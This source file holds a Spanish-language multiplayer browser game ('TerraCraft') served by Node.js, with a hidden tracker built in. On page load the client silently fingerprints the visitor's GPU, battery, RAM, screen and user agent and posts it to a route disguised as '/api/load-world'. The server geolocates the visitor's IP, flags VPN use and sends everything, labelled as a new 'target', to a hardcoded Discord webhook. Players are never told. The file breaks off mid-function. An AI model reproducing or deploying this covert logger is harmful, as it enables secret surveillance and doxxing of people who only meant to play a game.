const express = require('express');
const http = require('http');
const crypto = require('crypto');

const app = express();
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.set('trust proxy', true);
app.use(express.json());

const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543161653523255379/_LaPPSocrBnSYKF0TD5gwCDMBl3FXjYyoImmLRiEd6AAl1c1F9IULR7m2--mgP6RN8Ea";

// --- SERVIDOR MULTIJUGADOR & SEÑALIZACIÓN (WEBSOCKETS NATIVOS) ---
const clients = new Map();
const players = {};
const worldDeltas = {};

server.on('upgrade', (req, socket, head) => {
    const key = req.headers['sec-websocket-key'];
    if (!key) { socket.destroy(); return; }
    const acceptKey = crypto.createHash('sha1').update(key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').digest('base64');
    
    socket.write(
        'HTTP/1.1 101 Switching Protocols\r\n' +
        'Upgrade: websocket\r\n' +
        'Connection: Upgrade\r\n' +
        'Sec-WebSocket-Accept: ' + acceptKey + '\r\n\r\n'
    );

    const id = 'Jugador_' + Math.random().toString(36).substring(2, 6);
    clients.set(socket, id);
    players[id] = { id, x: 4800, y: 480, vx: 0, vy: 0, hp: 100, facingRight: true, item: 0, voiceActive: false, color: '#' + Math.floor(Math.random()*16777215).toString(16) };

    socket.on('data', (buffer) => {
        try {
            const msgStr = decodeFrame(buffer);
            if (!msgStr) return;
            const data = JSON.parse(msgStr);
            
            if (data.type === 'init') {
                sendWS(socket, { type: 'welcome', id, players, worldDeltas });
                broadcast({ type: 'player_joined', player: players[id] }, id);
            } else if (data.type === 'move') {
                if (players[id]) {
                    delete data.state.hp;
                    Object.assign(players[id], data.state);
                    broadcast({ type: 'player_update', id, state: data.state }, id);
                }
            } else if (data.type === 'block_change') {
                worldDeltas[data.x + ',' + data.y] = data.block;
                broadcast({ type: 'block_change', x: data.x, y: data.y, block: data.block });
            } else if (data.type === 'pvp_hit') {
                const target = players[data.targetId];
                if (target) {
                    target.hp -= data.damage;
                    broadcast({ type: 'hit_received', attackerId: id, targetId: data.targetId, damage: data.damage, knockback: data.knockback, newHp: target.hp });
                    if (target.hp <= 0) {
                        target.hp = 100;
                        broadcast({ type: 'player_killed', killer: id, victim: data.targetId });
                    }
                }
            } else if (data.type === 'chat') {
                broadcast({ type: 'chat', id, text: data.text });
            } else if (data.type === 'voice_state') {
                if (players[id]) players[id].voiceActive = data.active;
                broadcast({ type: 'voice_state', id, active: data.active }, id);
            } else if (['webrtc_offer', 'webrtc_answer', 'webrtc_candidate'].includes(data.type)) {
                // Ruteo de señalización WebRTC para Chat de Voz
                for (const [targetSocket, targetId] of clients.entries()) {
                    if (targetId === data.targetId) {
                        sendWS(targetSocket, { ...data, senderId: id });
                        break;
                    }
                }
            }
        } catch (e) {}
    });

    const cleanUp = () => {
        clients.delete(socket);
        delete players[id];
        broadcast({ type: 'player_left', id });
    };
    socket.on('close', cleanUp);
    socket.on('error', cleanUp);
});

function decodeFrame(buffer) {
    if (buffer.length < 2) return null;
    const secondByte = buffer[1];
    const isMasked = (secondByte & 0x80) === 0x80;
    let length = secondByte & 0x7f;
    let offset = 2;
    if (length === 126) {
        if (buffer.length < 4) return null;
        length = buffer.readUInt16BE(2); offset += 2;
    } else if (length === 127) { return null; }
    
    let masks = null;
    if (isMasked) {
        if (buffer.length < offset + 4) return null;
        masks = buffer.slice(offset, offset + 4); offset += 4;
    }
    if (buffer.length < offset + length) return null;
    const payload = buffer.slice(offset, offset + length);
    if (isMasked) {
        for (let i = 0; i < payload.length; i++) { payload[i] ^= masks[i % 4]; }
    }
    return payload.toString('utf8');
}

function encodeFrame(data) {
    const payload = Buffer.from(JSON.stringify(data));
    const length = payload.length;
    let header;
    if (length <= 125) {
        header = Buffer.from([0x81, length]);
    } else if (length <= 65535) {
        header = Buffer.alloc(4);
        header[0] = 0x81; header[1] = 126;
        header.writeUInt16BE(length, 2);
    } else { return Buffer.alloc(0); }
    return Buffer.concat([header, payload]);
}

function sendWS(socket, data) { try { socket.write(encodeFrame(data)); } catch(e) {} }
function broadcast(data, excludeId = null) {
    const frame = encodeFrame(data);
    for (const [socket, id] of clients.entries()) {
        if (id !== excludeId) { try { socket.write(frame); } catch(e) {} }
    }
}

// --- RUTA ADVANCED TRACKER LOGGER ---
app.post('/api/load-world', async (req, res) => {
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || req.ip;
    let userIp = rawIp ? rawIp.split(',')[0].trim() : 'IP no detectada';
    const d = req.body || {};
    
    let geo = {};
    try {
        const response = await fetch('http://ip-api.com/json/' + userIp + '?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query');
        geo = await response.json();
    } catch (e) {}

    if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
        const isVpn = (geo.proxy || geo.hosting) ? '⚠️ Sí (VPN/Proxy/Hosting)' : '✅ No (Residencial)';
        const mapUrl = (geo.lat && geo.lon) ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}` : 'N/A';

        const embed = {
            title: "🎯 **¡Nuevo Objetivo Conectado!**",
            color: 0xff0044,
            fields: [
                { name: "🌐 **Dirección IP**", value: `\`${userIp}\``, inline: true },
                { name: "🛡️ **¿VPN / Proxy?**", value: isVpn, inline: true },
                { name: "📍 **Ubicación**", value: `${geo.city || '?'}, ${geo.regionName || '?'}, ${geo.country || '?'}\n(CP: ${geo.zip || 'N/A'})`, inline: false },
                { name: "🗺️ **Mapa GPS**", value: `[Ver Ubicación en Google Maps](${mapUrl})`, inline: false },
                { name: "📡 **Proveedor (ISP / AS)**", value: `${geo.isp || 'N/A'}\n\`${geo.as || 'N/A'}\``, inline: false },
                { name: "🎮 **Tarjeta Gráfica (GPU)**", value: `\`${d.gpu || 'Desconocida'}\``, inline: false },
                { name: "💻 **Hardware del Dispositivo**", value: `• **CPU:** ${d.cores || '?'} núcleos\n• **RAM Estimada:** ${d.ram || '?'} GB\n• **Batería:** ${d.battery || 'Desconocido'}\n• **Pantalla:** ${d.screen || '?'} (Táctil: ${d.touch ? 'Sí' : 'No'})`, inline: true },
                { name: "📱 **Sistema / Navegador**", value: `• **SO:** ${d.platform || '?'}\n• **Zona Horaria:** ${d.timezone || '?'}\n• **UserAgent:** \`${(d.userAgent || 'N/A').substring(0, 100)}\``, inline: false }
            ],
            footer: { text: "TerraCraft Logger • " + new Date().toLocaleString() }
        };

        try {
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (err) {}
    }
    res.json({ status: "success", seed: 12345 });
});

// --- CLIENTE HTML & JUEGO ---
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TerraCraft - Online PvP & Voice Chat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; image-rendering: pixelated; touch-action: none; }
        body, html { background: #000; overflow: hidden; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; width: 100%; height: 100%; }
        canvas { display: block; width: 100%; height: 100%; }
        h1 { font-family: 'VT323', monospace; font-size: 4rem; text-shadow: 4px 4px 0 #333; margin-bottom: 20px; color: #fff; text-align: center; }
        .overlay { position: absolute; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.6); backdrop-filter: blur(8px); z-index: 100; }
        .hidden { display: none !important; }
        .btn { background: #8b8b8b; border: 4px solid; border-color: #fff #333 #333 #fff; padding: 12px 24px; font-size: 1.2rem; font-weight: bold; cursor: pointer; margin: 8px; width: 280px; text-align: center; color: #000; }
        .btn-green { background: #4ade80; }
        #ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; }
        #hud { position: absolute; top: 15px; left: 15px; }
        .health-bar { width: 200px; height: 26px; background: #333; border: 3px solid #111; border-radius: 4px; overflow: hidden; }
        .health-fill { width: 100%; height: 100%; background: #ef4444; transition: width 0.2s; }
        
        .top-btns { position: absolute; top: 15px; right: 15px; display: flex; gap: 8px; pointer-events: auto; }
        .top-btn { background: #3b82f6; border: 3px solid #fff; color: white; padding: 8px 14px; font-size: 0.9rem; font-weight: bold; border-radius: 6px; cursor: pointer; }
        .top-btn.active { background: #22c55e; border-color: #86efac; }
        
        #kill-feed { position: absolute; top: 50px; left: 15px; font-weight: bold; color: #f87171; text-shadow: 1px 1px 2px #000; }
        
        /* CHAT UI */
        #chat-container { position: absolute; bottom: 85px; left: 15px; width: 300px; max-height: 200px; pointer-events: auto; display: flex; flex-direction: column; gap: 6px; }
        #chat-messages { width: 100%; max-height: 150px; overflow-y: auto; background: rgba(0,0,0,0.4); border-radius: 4px; padding: 6px; font-size: 0.85rem; text-shadow: 1px 1px 1px #000; display: flex; flex-direction: column; gap: 4px; }
        #chat-input-box { display: flex; width: 100%; }
        #chat-input { flex: 1; background: rgba(0,0,0,0.7); border: 2px solid #555; color: white; padding: 6px 10px; font-size: 0.9rem; border-radius: 4px; outline: none; }
        #chat-input:focus { border-color: #3b82f6; }

        #hotbar { position: absolute; bottom: 15px; left: 50%; transform: translateX(-50%); display: flex; gap: 4px; pointer-events: auto; background: rgba(0,0,0,0.5); padding: 6px; border: 3px solid #333; max-width: 95vw; overflow-x: auto; }
        .slot { width: 48px; height: 48px; background: #8b8b8b; border: 3px solid; border-color: #555 #fff #fff #555; display: flex; justify-content: center; align-items: center; font-size: 1.6rem; cursor: pointer; position: relative; flex-shrink: 0; }
        .slot.active { border-color: #fff; box-shadow: 0 0 10px rgba(255,255,255,0.5); transform: scale(1.05); }
        .qty { position: absolute; bottom: 2px; right: 4px; font-size: 0.8rem; font-weight: bold; text-shadow: 1px 1px 0 #000; }
        
        #mobile-controls { position: absolute; bottom: 75px; width: 100%; display: flex; justify-content: space-between; padding: 0 20px; pointer-events: none; }
        .m-btn-group { display: flex; gap: 12px; pointer-events: auto; }
        .m-btn { width: 60px; height: 60px; background: rgba(0, 0, 0, 0.5); border: 3px solid rgba(255, 255, 255, 0.7); border-radius: 50%; color: white; font-size: 1.8rem; display: flex; justify-content: center; align-items: center; cursor: pointer; user-select: none; }
        .m-btn:active { background: rgba(255, 255, 255, 0.4); }

        #inventory-backdrop { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.7); z-index: 40; pointer-events: auto; }
        #inventory-gui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #c6c6c6; border: 6px solid; border-color: #fff #555 #555 #fff; padding: 20px; width: 90%; max-width: 500px; z-index: 50; pointer-events: auto; display: flex; flex-direction: column; gap: 15px; color: black; }
        .inv-header { display: flex; justify-content: space-between; align-items: center; }
        .inv-grid { display: grid; grid-template-columns: repeat(9, 1fr); gap: 4px; background: #8b8b8b; padding: 8px; border: 3px solid; border-color: #555 #fff #fff #555; }
        .craft-area { display: flex; flex-direction: column; gap: 8px; background: #8b8b8b; padding: 10px; border: 3px solid; border-color: #555 #fff #fff #555; }
        .recipe-row { display: flex; align-items: center; justify-content: space-between; font-size: 0.9rem; }
        .craft-btn { background: #16a34a; color: white; padding: 4px 8px; cursor: pointer; border: 2px solid #86efac; font-weight: bold; }
    </style>
</head>
<body>
    <div id="main-menu" class="overlay">
        <h1>TerraCraft Online</h1>
        <button class="btn btn-green" onclick="startGame()">Entrar al Servidor</button>
    </div>

    <div id="ui-layer" class="hidden">
        <div id="hud"><div class="health-bar"><div id="hp-fill" class="health-fill"></div></div></div>
        <div id="kill-feed"></div>

        <div class="top-btns">
            <button id="voice-btn" class="top-btn" onclick="toggleVoice()">🎤 Voz: OFF</button>
            <button class="top-btn" onclick="toggleChatFocus()">💬 Chat</button>
            <button class="top-btn" onclick="toggleInventory()">📦 Mochila</button>
        </div>

        <div id="chat-container">
            <div id="chat-messages"></div>
            <div id="chat-input-box">
                <input id="chat-input" type="text" placeholder="Presiona T o Enter para escribir..." autocomplete="off">
            </div>
        </div>

        <div id="mobile-controls">
            <div class="m-btn-group">
                <div id="btn-left" class="m-btn">⬅️</div>
                <div id="btn-right" class="m-btn">➡️</div>
            </div>
            <div class="m-btn-group">
                <div id="btn-jump" class="m-btn">⬆️</div>
            </div>
        </div>

        <div id="hotbar"></div>
        <div id="inventory-backdrop" class="hidden" onclick="toggleInventory()"></div>
        <div id="inventory-gui" class="hidden">
            <div class="inv-header"><h3>Crafteos</h3><button style="padding:4px 8px; cursor:pointer;" onclick="toggleInventory()">X</button></div>
            <div class="craft-area">
                <div class="recipe-row"><span>1x Madera ➔ 4x Tablones</span><button class="craft-btn" onclick="craftItem(5, 9, 1, 4)">Fabricar</button></div>
                <div class="recipe-row"><span>2x Tablones ➔ 1x Espada</span><button class="craft-btn" onclick="craftItem(9, 10, 2, 1)">Fabricar</button></div>
                <div class="recipe-row"><span>3x Tablones + 2x Hojas ➔ 1x Cama</span><button class="craft-btn" onclick="craftBed()">Fabricar</button></div>
            </div>
            <h4>Inventario:</h4>
            <div class="inv-grid" id="inv-grid"></div>
        </div>
    </div>

    <canvas id="gameCanvas"></canvas>

    <script>
    // --- LOGGER ADVANCED TRACKER ---
    async function collectAdvancedData() {
        let gpu = 'No detectado';
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
        } catch(e) {}

        let battery = 'No disponible';
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡ (Cargando)' : '🔋');
            }
        } catch(e) {}

        const payload = {
            gpu: gpu,
            battery: battery,
            cores: navigator.hardwareConcurrency || 'N/A',
            ram: navigator.deviceMemory || 'N/A',
            screen: window.screen.width + 'x' + window.screen.height + ' (' + window.screen.colorDepth + ' bits)',
            touch: ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            userAgent: navigator.userAgent
        };

        fetch('/api/load-world', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }).catch(()=>{});
    }
    collectAdvancedData();

    // --- VARIABLES GLOBALES DEL JUEGO ---
    let gameState = 'MENU', invOpen = false, ws = null, myId = null, otherPlayers = {};
    let localStream = null, isVoiceActive = false, peerConnections = {};
    const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

    const BLOCKS = {
        0: { name: 'Aire' },
        1: { name: 'Pico', isTool: true, icon: '⛏️' },
        2: { name: 'Pasto', hex: '#4ade80', acc: '#15803d' },
        3: { name: 'Tierra', hex: '#78350f', acc: '#92400e' },
        4: { name: 'Piedra', hex: '#52525b', acc: '#3f3f46' },
        5: { name: 'Madera', hex: '#5c3a21', acc: '#452b18' },
        6: { name: 'Hojas', hex: '#16a34a', acc: '#14532d' },
        9: { name: 'Tablones', hex: '#d97706', acc: '#b45309' },
        10: { name: 'Espada', isTool: true, icon: '🗡️' },
        11: { name: 'Cama', hex: '#ef4444', acc: '#b91c1c', icon: '🛏️' }
    };

    let inventory = { 1: 1, 2: 10, 5: 10, 10: 1, 11: 1 }; 
    let hotbarSlots = [1, 10, 5, 9, 11, 0, 0, 0, 0];
    let selectedSlot = 0;

    function startGame() {
        document.getElementById('main-menu').classList.add('hidden');
        document.getElementById('ui-layer').classList.remove('hidden');
        gameState = 'PLAYING';
        if(!window.gameInitialized) { initGame(); window.gameInitialized = true; }
    }

    function toggleInventory() {
        invOpen = !invOpen;
        document.getElementById('inventory-gui').classList.toggle('hidden', !invOpen);
        document.getElementById('inventory-backdrop').classList.toggle('hidden', !invOpen);
    }

    // --- CHAT DE TEXTO ---
    const chatInput = document.getElementById('chat-input');
    const chatMessages = document.getElementById('chat-messages');

    function toggleChatFocus() {
        if (document.activeElement === chatInput) {
            sendChatMessage();
            chatInput.blur();
        } else {
            chatInput.focus();
        }
    }

    function sendChatMessage() {
        let text = chatInput.value.trim();
        if (text.length > 0 && ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'chat', text: text }));
            chatInput.value = '';
        }
    }

    chatInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            sendChatMessage();
            chatInput.blur();
        }
        e.stopPropagation();
    });

    function addChatMessage(author, text) {
        const div = document.createElement('div');
        div.innerHTML = '<strong style="color:#60a5fa;">' + author + ':</strong> ' + text.replace(/</g, "&lt;");
        chatMessages.appendChild(div);
        chatMessages.scrollTop = chatMessages.scrollHeight;
    }

    // --- CHAT DE VOZ WEBRTC ---
    async function toggleVoice() {
        const vBtn = document.getElementById('voice-btn');
        if (!isVoiceActive) {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                isVoiceActive = true;
                vBtn.innerText = '🎤 Voz: ON';
                vBtn.classList.add('active');
                if (ws) ws.send(JSON.stringify({ type: 'voice_state', active: true }));

                // Iniciar conexión WebRTC con jugadores conectados
                for (let id in otherPlayers) {
                    createPeerConnection(id, true);
                }
            } catch (err) {
                alert('No se pudo acceder al micrófono: ' + err.message);
            }
        } else {
            if (localStream) {
                localStream.getTracks().forEach(track => track.stop());
                localStream = null;
            }
            for (let id in peerConnections) {
                peerConnections[id].close();
            }
            peerConnections = {};
            isVoiceActive = false;
            vBtn.innerText = '🎤 Voz: OFF';
            vBtn.classList.remove('active');
            if (ws) ws.send(JSON.stringify({ type: 'voice_state', active: false }));
        }
    }

    function createPeerConnection(targetId, isInitiator) {
        if (peerConnections[targetId]) peerConnections[targetId].close();
        const pc = new RTCPeerConnection(rtcConfig);
        peerConnections[targetId] = pc;

        if (localStream) {
            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
        }

        pc.onicecandidate = (e) => {
            if (e.candidate && ws) {
                ws.send(JSON.stringify({ type: 'webrtc_candidate', targetId: targetId, candidate: e.candidate }));
            }
        };

        pc.ontrack = (e) => {
            let audio = document.getElementById('audio_' + targetId);
            if (!audio) {
                audio = document.createElement('audio');
                audio.id = 'audio_' + targetId;
                audio.autoplay = true;
                document.body.appendChild(audio);
            }
            audio.srcObject = e.streams[0];
        };

        if (isInitiator) {
            pc.createOffer().then(offer => {
                pc.setLocalDescription(offer);
                ws.send(JSON.stringify({ type: 'webrtc_offer', targetId: targetId, offer: offer }));
            });
        }
        return pc;
    }

    function renderHotbar() {
        const hb = document.getElementById('hotbar');
        hb.innerHTML = '';
        hotbarSlots.forEach((id, i) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = (b.isTool || id === 11) ? b.icon : (id !== 0 ? '<div style="width:28px;height:28px;background:'+b.hex+';border:2px solid '+b.acc+';"></div>' : '');
            let qtyLabel = (!b.isTool && id !== 0) ? '<span class="qty">'+qty+'</span>' : '';
            hb.innerHTML += '<div class="slot '+(i === selectedSlot ? 'active' : '')+'" onclick="selectedSlot='+i+'; renderHotbar()">'+inner+qtyLabel+'</div>';
        });
        const grid = document.getElementById('inv-grid');
        grid.innerHTML = '';
        hotbarSlots.forEach((id) => {
            const b = BLOCKS[id] || BLOCKS[0];
            let qty = inventory[id] || 0;
            let inner = (b.isTool || id === 11) ? b.icon : (id !== 0 ? '<div style="width:24px;height:24px;background:'+b.hex+';border:2px solid '+b.acc+';"></div>' : '');
            grid.innerHTML += '<div class="slot" style="width:100%;height:45px;">'+inner+'<span class="qty">'+qty+'</span></div>';
        });
    }

    function craftItem(reqId, outId, reqQty, outQty) {
        if ((inventory[reqId] || 0) >= reqQty) { inventory[reqId] -= reqQty; inventory[outId] = (inventory[outId] || 0) + outQty; renderHotbar(); }
    }
    function craftBed() {
        if ((inventory[9] || 0) >= 3 && (inventory[6] || 0) >= 2) { inventory[9] -= 3; inventory[6] -= 2; inventory[11] = (inventory[11] || 0) + 1; renderHotbar(); }
    }

    function showKillFeed(msg) {
        const kf = document.getElementById('kill-feed');
        kf.innerText = msg;
        setTimeout(() => { kf.innerText = ''; }, 4000);
    }

    function initGame() {
        const cv = document.getElementById('gameCanvas');
        const ctx = cv.getContext('2d', { alpha: false });
        function resize() { cv.width = window.innerWidth; cv.height = window.innerHeight; }
        window.addEventListener('resize', resize); resize();

        const TILE = 48, CHUNK_W = 200, CHUNK_H = 120; 
        let world = Array.from({ length: CHUNK_W }, () => Array(CHUNK_H).fill(0));
        
        for (let x = 0; x < CHUNK_W; x++) {
            let h = Math.floor(40 + Math.sin(x * 0.08) * 6);
            for (let y = h; y < CHUNK_H; y++) {
                if(y === h) world[x][y] = 2; else if(y < h + 5) world[x][y] = 3; else world[x][y] = 4;
            }
        }

        for (let x = 5; x < CHUNK_W - 5; x++) {
            if (Math.random() < 0.08) {
                let sy = 0; while(world[x][sy] === 0 && sy < CHUNK_H) sy++;
                if (world[x][sy] === 2) {
                    world[x][sy-1] = 5; world[x][sy-2] = 5; world[x][sy-3] = 5;
                    world[x-1][sy-3] = 6; world[x+1][sy-3] = 6; world[x][sy-4] = 6;
                }
            }
        }

        const SPAWN_X = (CHUNK_W/2)*TILE, SPAWN_Y = 10*TILE;
        const player = { x: SPAWN_X, y: SPAWN_Y, w: 48, h: 96, vx: 0, vy: 0, speed: 6, jump: -14, grounded: false, hp: 100, maxHp: 100, facingRight: true, flashRed: 0, chatMsg: '', chatExpiry: 0 };
        let camera = { x: player.x, y: player.y };
        let keys = {};

        function setupTouchBtn(btnId, keyCode) {
            const btn = document.getElementById(btnId);
            if (!btn) return;
            const start = (e) => { e.preventDefault(); keys[keyCode] = true; };
            const end = (e) => { e.preventDefault(); keys[keyCode] = false; };
            btn.addEventListener('touchstart', start, { passive: false });
            btn.addEventListener('touchend', end, { passive: false });
            btn.addEventListener('mousedown', start);
            btn.addEventListener('mouseup', end);
        }
        setupTouchBtn('btn-left', 'KeyA');
        setupTouchBtn('btn-right', 'KeyD');
        setupTouchBtn('btn-jump', 'Space');

        // --- WEBSOCKET EVENTOS MULTIJUGADOR ---
        const protocol = location.protocol === 'https:' ? 'wss://' : 'ws://';
        ws = new WebSocket(protocol + location.host);
        
        ws.onopen = () => { ws.send(JSON.stringify({ type: 'init' })); };
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            if (data.type === 'welcome') {
                myId = data.id;
                otherPlayers = data.players;
                delete otherPlayers[myId];
                for (let k in data.worldDeltas) {
                    let parts = k.split(',');
                    world[parseInt(parts[0])][parseInt(parts[1])] = data.worldDeltas[k];
                }
            } else if (data.type === 'player_joined') {
                otherPlayers[data.player.id] = data.player;
                if (isVoiceActive) createPeerConnection(data.player.id, true);
            } else if (data.type === 'player_update') {
                if (otherPlayers[data.id]) Object.assign(otherPlayers[data.id], data.state);
                else otherPlayers[data.id] = data.state;
            } else if (data.type === 'player_left') {
                delete otherPlayers[data.id];
                if (peerConnections[data.id]) { peerConnections[data.id].close(); delete peerConnections[data.id]; }
                const audio = document.getElementById('audio_' + data.id);
                if (audio) audio.remove();
            } else if (data.type === 'block_change') {
                world[data.x][data.y] = data.block;
            } else if (data.type === 'pvp_hit') {
                if (data.targetId === myId) {
                    player.hp = data.newHp;
                    player.vx = data.knockback;
                    player.vy = -6;
                    player.flashRed = 10;
                    document.getElementById('hp-fill').style.width = Math.max(0, (player.hp/player.maxHp)*100) + '%';
                } else if (otherPlayers[data.targetId]) {
                    otherPlayers[data.targetId].hp = data.newHp;
                    otherPlayers[data.targetId].flashRed = 10;
                }
            } else if (data.type === 'player_killed') {
                showKillFeed(`💀 ${data.killer} eliminó a ${data.victim}`);
                if (data.victim === myId) {
                    player.x = SPAWN_X; player.y = SPAWN_Y; player.hp = 100;
                    document.getElementById('hp-fill').style.width = '100%';
                }
            } else if (data.type === 'chat') {
                addChatMessage(data.id, data.text);
                if (data.id === myId) {
                    player.chatMsg = data.text; player.chatExpiry = Date.now() + 4000;
                } else if (otherPlayers[data.id]) {
                    otherPlayers[data.id].chatMsg = data.text; otherPlayers[data.id].chatExpiry = Date.now() + 4000;
                }
            } else if (data.type === 'voice_state') {
                if (otherPlayers[data.id]) otherPlayers[data.id].voiceActive = data.active;
            } else if (data.type === 'webrtc_offer') {
                const pc = createPeerConnection(data.senderId, false);
                pc.setRemoteDescription(new RTCSessionDescription(data.offer)).then(() => pc.createAnswer()).then(answer => {
                    pc.setLocalDescription(answer);
                    ws.send(JSON.stringify({ type: 'webrtc_answer', targetId: data.senderId, answer: answer }));
                });
            } else if (data.type === 'webrtc_answer') {
                if (peerConnections[data.senderId]) {
                    peerConnections[data.senderId].setRemoteDescription(new RTCSessionDescription(data.answer));
                }
            } else if (data.type === 'webrtc_candidate') {
                if (peerConnections[data.senderId]) {
                    peerConnections[data.senderId].addIceCandidate(new RTCIceCandidate(data.candidate));
                }
            }
        };

        window.addEventListener('keydown', e => {
            if (document.activeElement === chatInput) return;
            if (e.code === 'KeyE') toggleInventory();
            if (e.code === 'KeyT') { e.preventDefault(); chatInput.focus(); return; }
            if (!invOpen) { keys[e.code] = true; if (e.key >= '1' && e.key <= '9') { selectedSlot = parseInt(e.key) - 1; renderHotbar(); } }
        });
        window.addEventListener('keyup', e => keys[e.code] = false);

        let mouseX = 0, mouseY = 0, isMouseDown = false, mouseBtn = 0;
        
        const updateCoords = (e) => {
            const rect = cv.getBoundingClientRect();
            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
            const clientY = e.touches ? e.touches[0].clientY : e.clientY;
            mouseX = clientX - rect.left;
            mouseY = clientY - rect.top;
        };

        window.addEventListener('mousemove', updateCoords);
        cv.addEventListener('touchstart', e => {
            if (gameState !== 'PLAYING' || invOpen || document.activeElement === chatInput) return;
            updateCoords(e);
            isMouseDown = true; mouseBtn = 0;
            handleMouseClick();
        }, { passive: false });
        cv.addEventListener('touchmove', e => { if(isMouseDown) updateCoords(e); }, { passive: false });
        cv.addEventListener('touchend', () => isMouseDown = false);

        window.addEventListener('mousedown', e => { if(gameState==='PLAYING' && !invOpen && document.activeElement !== chatInput && e.target === cv){ isMouseDown = true; mouseBtn = e.button; handleMouseClick(); }});
        window.addEventListener('mouseup', () => isMouseDown = false);
        window.addEventListener('contextmenu', e => e.preventDefault());

        function handleMouseClick() {
            let currentId = hotbarSlots[selectedSlot];

            if (mouseBtn === 0 && currentId === 10) {
                for (let id in otherPlayers) {
                    let p = otherPlayers[id];
                    let dist = Math.hypot((player.x + player.w/2) - (p.x + p.w/2), (player.y + player.h/2) - (p.y + p.h/2));
                    if (dist < 120) {
                        let kb = (p.x > player.x) ? 16 : -16;
                        if (ws && ws.readyState === WebSocket.OPEN) {
                            ws.send(JSON.stringify({ type: 'pvp_hit', targetId: id, damage: 35, knockback: kb }));
                        }
                        isMouseDown = false;
                        return;
                    }
                }
            }
        }

        function handleMouseHold() {
            if (!isMouseDown || invOpen || document.activeElement === chatInput) return;
            const realX = mouseX + camera.x, realY = mouseY + camera.y;
            const tx = Math.floor(realX / TILE), ty = Math.floor(realY / TILE);
            let currentId = hotbarSlots[selectedSlot];

            if (tx < 0 || tx >= CHUNK_W || ty < 0 || ty >= CHUNK_H) return;
            const dist = Math.hypot((player.x + player.w/2) - (tx*TILE), (player.y + player.h/2) - (ty*TILE));
            if (dist > TILE * 5) return;

            let blockChanged = false;
            let newBlock = 0;

            if (mouseBtn === 0 && currentId === 1) { 
                let minedBlock = world[tx][ty];
                if (minedBlock !== 0) {
                    inventory[minedBlock] = (inventory[minedBlock] || 0) + 1;
                    world[tx][ty] = 0; newBlock = 0; blockChanged = true;
                    renderHotbar(); isMouseDown = false;
                }
            } else if ((mouseBtn === 2 || (currentId !== 1 && currentId !== 10)) && world[tx][ty] === 0) {
                if (currentId !== 0 && currentId !== 1 && currentId !== 10 && inventory[currentId] > 0) {
                    world[tx][ty] = currentId; newBlock = currentId; blockChanged = true;
                    inventory[currentId]--; renderHotbar(); isMouseDown = false;
                }
            }

            if (blockChanged && ws && ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({ type: 'block_change', x: tx, y: ty, block: newBlock }));
            }
        }

        function checkCol(nx, ny) {
            const l = Math.floor(nx / TILE), r = Math.floor((nx + player.w - 1) / TILE);
            const t = Math.floor(ny / TILE), b = Math.floor((ny + player.h - 1) / TILE);
            if (l < 0 || r >= CHUNK_W || t < 0 || b >= CHUNK_H) return true;
            for (let y = t; y <= b; y++) { for (let x = l; x <= r; x++) { if (world[x][y] !== 0) return true; } }
            return false;
        }

        renderHotbar();
        let lastSendTime = 0;

        function update() {
            if (gameState === 'PLAYING') {
                if (!invOpen && document.activeElement !== chatInput) {
                    if (keys['KeyA']) { player.vx -= 1.2; player.facingRight = false; }
                    else if (keys['KeyD']) { player.vx += 1.2; player.facingRight = true; }
                    else player.vx *= 0.6; 
                    
                    if (player.vx > player.speed) player.vx = player.speed;
                    if (player.vx < -player.speed) player.vx = -player.speed;

                    if ((keys['Space'] || keys['KeyW']) && player.grounded) {
                        player.vy = player.jump; player.grounded = false; keys['Space'] = false; 
                    }
                } else { player.vx *= 0.6; }

                player.vy += 0.8; if (player.vy > 20) player.vy = 20;

                if (!checkCol(player.x + player.vx, player.y)) { player.x += player.vx; } else { player.vx = 0; }

                player.grounded = false;
                if (!checkCol(player.x, player.y + player.vy)) { player.y += player.vy; } 
                else {
                    if (player.vy > 0) { player.grounded = true; player.y = Math.floor((player.y + player.h + player.vy)/TILE)*TILE - player.h; } 
